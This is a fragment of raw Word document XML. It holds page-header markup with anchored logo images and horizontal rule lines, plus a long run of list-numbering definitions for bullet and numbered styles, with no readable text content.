      </w:r>
    </w:p>
    <w:p w14:paraId="20065483" w14:textId="77777777" w:rsidR="00375046" w:rsidRDefault="00375046" w:rsidP="007F2B57"/>
    <w:p w14:paraId="2DE4DBC4" w14:textId="77777777" w:rsidR="00375046" w:rsidRDefault="00375046" w:rsidP="007F2B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94CAE" w14:textId="7C93E373" w:rsidR="00123EC6" w:rsidRPr="0088153E" w:rsidRDefault="00123EC6" w:rsidP="0088153E">
    <w:pPr>
      <w:pStyle w:val="Header"/>
    </w:pPr>
    <w:r w:rsidRPr="0088153E">
      <w:rPr>
        <w:noProof/>
        <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
      </w:rPr>
      <w:drawing>
        <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659264" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="61928881" wp14:editId="6804B71A">
          <wp:simplePos x="0" y="0"/>
          <wp:positionH relativeFrom="column">
            <wp:posOffset>4800600</wp:posOffset>
          </wp:positionH>
          <wp:positionV relativeFrom="page">
            <wp:posOffset>228600</wp:posOffset>
          </wp:positionV>
          <wp:extent cx="1261745" cy="5207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CA" w:eastAsia="en-CA"/>
      </w:rPr>
      <mc:AlternateContent>
        <mc:Choice Requires="wps">
          <w:drawing>
            <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251661312" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="0051FB5C" wp14:editId="2AB4754C">
              <wp:simplePos x="0" y="0"/>
              <wp:positionH relativeFrom="column">
                <wp:posOffset>-9525</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="paragraph">
                <wp:posOffset>324485</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="5943600" cy="0"/>
              <wp:effectExtent l="19050" t="19050" r="0" b="19050"/>
              <wp:wrapNone/>
              <wp:docPr id="6" name="Straight Connector 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2504D6" id="Straight Connector 6"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75pt,25.55pt" to="467.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" strokecolor="#005eb8"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377F" w14:textId="6321CB9C" w:rsidR="00123EC6" w:rsidRPr="00EF5C89" w:rsidRDefault="00123EC6" w:rsidP="004974D2">
    <w:pPr>
      <w:pStyle w:val="Header"/>
      <w:tabs>
        <w:tab w:val="clear" w:pos="4680"/>
        <w:tab w:val="clear" w:pos="9360"/>
        <w:tab w:val="left" w:pos="2847"/>
      </w:tabs>
    </w:pPr>
    <w:r w:rsidRPr="0088153E">
      <w:rPr>
        <w:noProof/>
        <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
      </w:rPr>
      <w:drawing>
        <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251655168" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="57322C47" wp14:editId="343A4B53">
          <wp:simplePos x="0" y="0"/>
          <wp:positionH relativeFrom="column">
            <wp:posOffset>4787900</wp:posOffset>
          </wp:positionH>
          <wp:positionV relativeFrom="page">
            <wp:posOffset>228600</wp:posOffset>
          </wp:positionV>
          <wp:extent cx="1261745" cy="5207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CA" w:eastAsia="en-CA"/>
      </w:rPr>
      <mc:AlternateContent>
        <mc:Choice Requires="wps">
          <w:drawing>
            <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251657216" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4632B578" wp14:editId="2801DA07">
              <wp:simplePos x="0" y="0"/>
              <wp:positionH relativeFrom="column">
                <wp:posOffset>-34925</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="paragraph">
                <wp:posOffset>324485</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="5943600" cy="0"/>
              <wp:effectExtent l="19050" t="19050" r="0" b="19050"/>
              <wp:wrapNone/>
              <wp:docPr id="5" name="Straight Connector 5"/>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F84752" id="Straight Connector 5" o:spid="_x0000_s1026" style="position:absolute;flip:x;z-index:251657216;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" strokecolor="#005eb8" strokeweight="2.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13C6" w14:textId="77777777" w:rsidR="00123EC6" w:rsidRPr="00EF5C89" w:rsidRDefault="00123EC6" w:rsidP="004974D2">
    <w:pPr>
      <w:pStyle w:val="Header"/>
      <w:tabs>
        <w:tab w:val="clear" w:pos="4680"/>
        <w:tab w:val="clear" w:pos="9360"/>
        <w:tab w:val="left" w:pos="2847"/>
      </w:tabs>
    </w:pPr>
    <w:r w:rsidRPr="0088153E">
      <w:rPr>
        <w:noProof/>
        <w:lang w:val="en-CA" w:eastAsia="en-CA"/>
      </w:rPr>
      <w:drawing>
        <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251665408" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3B6D4FB2" wp14:editId="6B97456A">
          <wp:simplePos x="0" y="0"/>
          <wp:positionH relativeFrom="column">
            <wp:posOffset>4787900</wp:posOffset>
          </wp:positionH>
          <wp:positionV relativeFrom="page">
            <wp:posOffset>228600</wp:posOffset>
          </wp:positionV>
          <wp:extent cx="1261745" cy="520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CA" w:eastAsia="en-CA"/>
      </w:rPr>
      <mc:AlternateContent>
        <mc:Choice Requires="wps">
          <w:drawing>
            <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251666432" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="254EE6F9" wp14:editId="5EFFB4D9">
              <wp:simplePos x="0" y="0"/>
              <wp:positionH relativeFrom="column">
                <wp:posOffset>-34925</wp:posOffset>
              </wp:positionH>
              <wp:positionV relativeFrom="paragraph">
                <wp:posOffset>324485</wp:posOffset>
              </wp:positionV>
              <wp:extent cx="5943600" cy="0"/>
              <wp:effectExtent l="19050" t="19050" r="0" b="19050"/>
              <wp:wrapNone/>
              <wp:docPr id="36" name="Straight Connector 3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5F4E6F" id="Straight Connector 36"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" strokecolor="#005eb8"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5C5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="52EE0188"/>
    <w:lvl w:ilvl="0" w:tplc="B05E956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3700598"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7B167CA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04D45D5D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8DCC731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6133213"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5CA4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847FA1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3B9A02E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A865855"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="10A86E12"/>
    <w:lvl w:ilvl="0" w:tplc="F54CF91A">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01">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2520" w:hanging="180"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:r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0CA66DAB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1DCEAEE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CD62549"/>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801C6E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9E4EABC6"/>
    <w:lvl w:ilvl="0" w:tplc="703E939A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="•"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="FB4C4038">
      <w:start w:val="61"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="•"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="228EF97C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="•"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="ACC0F596" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="•"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="FC4A4D1E" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="•"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="050265E4" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="•"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="4F0CD136" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="•"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="A3965C14" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="•"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="CE08C6A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8BA43EB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="22267E06"/>
    <w:lvl w:ilvl="0" w:tplc="2EBE8E66">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A266B0D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="2938CA8E"/>
    <w:lvl w:ilvl="0" w:tplc="F54CF91A">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01">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2520" w:hanging="180"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:r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212E0A9B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="032063A0"/>
    <w:lvl w:ilvl="0" w:tplc="10090001">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2700" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="10090003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3420" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="10090005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4140" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="10090001" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4860" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="10090003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5580" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="10090005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6300" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="10090001" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="7020" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="10090003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="7740" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="10090005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="8460" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="12" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="23257597"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="FA02D2C0"/>
    <w:lvl w:ilvl="0" w:tplc="E4924644">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 w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="25BD0992"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BB729E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CD42A1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9C62C282"/>
    <w:lvl w:ilvl="0" w:tplc="AFD2A828">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1210" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:b w:val="0"/>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2A33185F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A614E7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B730A46"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="AAD66190"/>
    <w:lvl w:ilvl="0" w:tplc="10090001">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2700" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="10090003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3420" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="10090005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4140" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="10090001" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4860" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="10090003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5580" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="10090005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="6300" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="10090001" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="7020" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="10090003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="7740" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="10090005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="8460" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="17" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="2C0B69F2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="43EAD0C8"/>
    <w:lvl w:ilvl="0" w:tplc="2EBE8E66">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D597879"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="00622140"/>
    <w:lvl w:ilvl="0" w:tplc="1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E6043D4"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0A9AF15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360397A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1116C25C"/>
    <w:lvl w:ilvl="0" w:tplc="B718B700">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3C14359"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="EF3A4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526F1F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="DDAA6E0A"/>
    <w:lvl w:ilvl="0" w:tplc="F53211B0">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1080" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="default"/>
        <w:sz w:val="28"/>
        <w:szCs w:val="28"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="DCFEBC8E">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1800" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:sz w:val="28"/>
        <w:szCs w:val="28"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="A41EA364">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="2520" w:hanging="180"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman" w:hint="default"/>
        <w:sz w:val="28"/>
        <w:szCs w:val="28"/>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B93B90"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="89A027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89E3175"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E10872B8"/>
    <w:lvl w:ilvl="0" w:tplc="D68C652C">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="915" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="10090019" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1635" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="1009001B" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="2355" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="1009000F" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3075" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="10090019" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%5."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3795" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="1009001B" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%6."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="4515" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="1009000F" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5235" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="10090019" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5955" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="1009001B" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="6675" w:hanging="180"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="25" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="39EC552C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="DA020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3D7C7C57"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DD186FEE"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
        <w:sz w:val="28"/>
        <w:szCs w:val="28"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>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lowerLetter"/>
      <w:lvlText w:val="%5."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:r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7" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="3E3548AA"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0A8E6432"/>
    <w:lvl w:ilvl="0" w:tplc="F54CF91A">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8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="3EC006F5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0576F718"/>
    <w:lvl w:ilvl="0" w:tplc="F54CF91A">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0D">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2520" w:hanging="180"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:r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9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="40356956"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1F5A02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A0571E1"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="CDC45E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AD174A5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="22267E06"/>
    <w:lvl w:ilvl="0" w:tplc="2EBE8E66">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51864A60"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9C62C282"/>
    <w:lvl w:ilvl="0" w:tplc="AFD2A828">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1210" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
        <w:b w:val="0"/>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3" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="52B76F72"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="64A45D8E"/>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823B53"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5BCE490E"/>
    <w:lvl w:ilvl="0" w:tplc="10090019">
      <w:start w:val="1"/>
